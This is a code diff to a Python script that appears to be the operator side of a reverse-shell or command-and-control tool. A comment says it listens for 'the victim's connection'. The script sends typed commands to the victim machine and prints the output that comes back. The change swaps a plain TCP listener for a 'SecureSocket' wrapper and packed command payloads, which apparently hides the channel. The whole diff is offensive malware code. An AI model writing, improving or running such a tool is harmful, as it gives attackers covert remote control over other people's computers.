@@ -1,6 +1,8 @@
 import socket
 import sys
-from payload import Payload
+from command_payload import CommandPayload
+from command_payload import parse_payload_to_output
+from secure_socket import SecureSocket
 
 # Port listening for the victim's connection
 port = 7890
@@ -29,24 +31,14 @@ def parse_custom_command(cmd: str) -> str:
 def create_socket():
     global output_style
 
-    # Create a TCP/IP socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Bind the socket to accept any ip at port
-    server_address = ('0.0.0.0', port)
-    sock.bind(server_address)
-
-    print("Waiting for connection ...")
-    sock.listen()
-
-    # Accept an incoming connection
-    connection, client_address = sock.accept()
-    print('Connected by', client_address)
+    secure_socket = SecureSocket()
+    secure_socket.wait_for_connection()
 
     # Receive data from the client
     while True:
         prompt = "Send command (type \"-> help\" to help): " if output_style == "full" else ">"
         command = input(prompt)
+
         # Parse custom commands
         if command.split(" ")[0] == "->":
             custom_command = command.split(" ")[1]
@@ -56,13 +48,15 @@ def create_socket():
         if len(command) == 0:
             continue
 
+        # Send command
         command = bytes(command, encoding='utf-8')
-        connection.sendall(command)
+        payload = CommandPayload(command=command)
+        packet = payload.pack()
+        secure_socket.send(packet)
 
-        packet = connection.recv(1024)
-        payload = Payload(raw_packet=packet)
-
-        print(payload.format_output(output_style))
+        # Receive result
+        payload = secure_socket.receive(parse_payload_to_output)
+        print(payload.formatted_output(output_style))
 
 
 def show_logo():
